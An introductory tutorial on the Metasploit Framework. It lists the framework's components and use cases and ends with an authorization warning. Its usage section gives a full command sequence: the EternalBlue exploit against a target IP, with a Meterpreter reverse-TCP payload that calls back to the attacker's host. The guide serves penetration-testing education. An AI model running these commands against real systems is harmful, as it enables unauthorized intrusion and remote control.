# What is Metasploit and How to Use It?

## 💣 What is Metasploit?

**Metasploit Framework** is a powerful, open-source security testing tool used by cybersecurity professionals and penetration testers.

The main purposes of Metasploit are:

- Identifying vulnerabilities  
- Conducting penetration tests on target systems  
- Running exploit modules  
- Delivering payloads and managing sessions

Metasploit is designed for both offensive and defensive security teams to test and evaluate system security.

---

## 🧰 How to Use Metasploit?

### 1. Launch Metasploit
```bash
msfconsole
```

### 2. Select an Exploit
```bash
use exploit/windows/smb/ms17_010_eternalblue
```

### 3. Set Target Information
```bash
set RHOSTS 192.168.1.10
```

### 4. Set Payload
```bash
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
```

### 5. Launch the Exploit
```bash
exploit
```

---

## 🧪 Key Components of Metasploit

| Component       | Description |
|------------------|-------------|
| **Exploit**      | A module that targets a specific vulnerability |
| **Payload**      | The code delivered to the target after successful exploitation |
| **Meterpreter**  | An interactive shell on the target system |
| **Auxiliary**    | Scanners, info-gathering tools, and DoS modules |
| **Post**         | Post-exploitation modules for analysis and persistence |

## 📌 Use Cases

- Red Team / Penetration testing operations  
- Cybersecurity labs and training environments  
- Vulnerability assessments and OSINT  
- Increasing security awareness and readiness

## ⚠️ Warning

Metasploit should **only be used in authorized test environments**. Using it against systems without permission is **illegal** and can lead to serious consequences.
